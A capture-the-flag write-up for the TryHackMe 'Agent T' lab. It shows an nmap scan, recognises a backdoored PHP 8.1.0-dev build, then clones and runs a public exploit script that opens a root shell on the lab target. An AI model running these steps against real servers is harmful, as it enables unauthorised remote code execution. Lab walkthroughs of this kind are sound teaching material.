```bash
# PLATFORM          . THM
# CTF NAME          . Agent T
# DESCRIPTION       . Something seems a little off with the server.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/agentt
```

```bash
nmap -sSVC -T5 -p- -oN agentT 10.10.231.14
```

```
PORT   STATE SERVICE VERSION

80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)
|_http-title:  Admin Dashboard
```

- Couldn't find anything suspicious on the website. In fact, it was just a template that was missing most of the essential pages (even `index.html` was missing). 

- The trick here was to identify that the PHP version used is `8.1.0-dev`. 

- After some googling around, I quickly found out that this version has a backdoor installed in it that allows RCE on the server running.

- The backdoor can be found [here](https://github.com/flast101/php-8.1.0-dev-backdoor-rce). 

```bash
git clone https://github.com/flast101/php-8.1.0-dev-backdoor-rce

cd php-8.1.0-dev-backdoor-rce

python3 backdoor_php_8.1.0-dev.py

Enter the host url:
http://10.10.231.14

Interactive shell is opened on http://10.10.231.14 

$ whoami
root
```

- The flag is at `/flag.txt`. 